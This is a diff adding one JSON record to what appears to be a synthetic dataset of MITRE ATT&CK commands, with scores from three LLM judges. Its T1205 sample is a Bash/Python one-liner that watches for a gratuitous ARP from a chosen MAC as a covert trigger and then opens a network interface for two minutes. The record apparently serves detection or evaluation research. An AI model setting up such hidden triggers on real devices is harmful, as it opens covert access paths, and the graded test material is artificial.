@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo python3 -c 'from scapy.all import sniff,ARP; import os; p=sniff(filter=\"arp\", lfilter=lambda x: x.haslayer(ARP) and x[ARP].psrc==x[ARP].pdst and x[ARP].hwsrc==\"66:77:88:99:aa:bb\", count=1)[0]; os.system(\"ciscoconf --apply \\\"interface GigabitEthernet0/1; no shutdown\\\" && (sleep 120; ciscoconf --apply \\\"interface GigabitEthernet0/1; shutdown\\\") &\")'",
+  "explanation": "Treats a gratuitous ARP from a specific MAC as a magic signal to bring up Gi0/1 for 2 minutes via ciscoconf. Requires sudo to sniff ARP frames.",
+  "rationale_steps": [
+    "Sniff ARP frames and identify gratuitous ARP (psrc==pdst) from a whitelisted MAC.",
+    "Enable the interface temporarily to allow management or lateral traffic.",
+    "No obfuscation; relies on ARP-based signaling channel.",
+    "Detection: monitor gratuitous ARP patterns and short-lived interface state changes in logs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-e2fc14f6",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and parentheses are maintained across the shell and embedded Python, with valid scapy and os.system usage and properly escaped inner quotes.",
+        "semantic_score": 4,
+        "semantic_justification": "It uses a specific gratuitous ARP as a covert trigger to execute a timed interface toggle consistent with Traffic Signaling, though it assumes a nonstandard 'ciscoconf' tool and appropriate device environment.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T17:54:21.023011Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with balanced parentheses and quotes, though the nested escaping of inner double quotes within the -c string (using backslash-escaped quotes inside a single-quoted Python string passed to bash) is technically unnecessary and slightly inconsistent, but the overall structure is parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements T1205 traffic signaling by using scapy to sniff for a gratuitous ARP (psrc==pdst) from a specific MAC address as a covert trigger to execute a network device configuration action via ciscoconf, which is operationally plausible, though 'ciscoconf' is a non-standard/fictional tool and the platform context (running Python/scapy on a network device) is somewhat unrealistic for typical Cisco IOS environments.",
+        "combined_score": 4.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-19T04:03:14.988484Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, correctly using nested quoting for a bash-python-shell sequence and properly implementing Scapy's sniff parameters and logic.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly illustrates MITRE ATT&CK T1205 by using a specific gratuitous ARP packet (hardware source and IP source/destination match) as a 'magic' trigger to modify device configuration via a subshell.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T04:03:22.489494Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
